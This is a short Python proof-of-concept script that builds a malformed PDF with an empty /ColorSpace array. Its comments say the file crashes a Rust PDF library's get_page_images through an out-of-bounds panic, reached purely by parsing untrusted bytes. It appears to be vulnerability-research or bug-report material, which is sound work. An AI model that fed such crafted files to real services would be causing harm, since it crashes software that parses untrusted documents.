#!/usr/bin/env python3
# Parse-reachable PoC for document.rs:779 (empty /ColorSpace [] -> array[0] OOB in get_page_images).
# CONFIRMED 2026-07-18: this 487-byte PDF, parsed via Document::load_mem, then get_page_images(page),
# panics `index out of bounds: len 0 index 0` under plain release (overflow-checks off).
# NOTE: unlike the reattack harness (which built the Document via the builder API), THIS is reached
# purely by parsing untrusted bytes through the public load_mem — genuine parse-reachability.
import sys
objs=[
 b"<</Type/Catalog/Pages 2 0 R>>",
 b"<</Type/Pages/Kids[3 0 R]/Count 1>>",
 b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 100 100]/Resources<</XObject<</Im0 4 0 R>>>>>>",
 b"<</Type/XObject/Subtype/Image/Width 1/Height 1/ColorSpace[]/BitsPerComponent 8/Length 0>>stream\n\nendstream",
]
out=bytearray(b"%PDF-1.5\n"); offs=[0]
for i,b in enumerate(objs,1): offs.append(len(out)); out+=b"%d 0 obj %s endobj\n"%(i,b)
xo=len(out); n=len(objs)+1
out+=b"xref\n0 %d\n0000000000 65535 f \n"%n
for o in offs[1:]: out+=b"%010d 00000 n \n"%o
out+=b"trailer <</Root 1 0 R/Size %d>>\nstartxref\n%d\n%%%%EOF"%(n,xo)
open(sys.argv[1] if len(sys.argv)>1 else "img_empty_cs.pdf","wb").write(out)
print("wrote",len(out),"bytes")
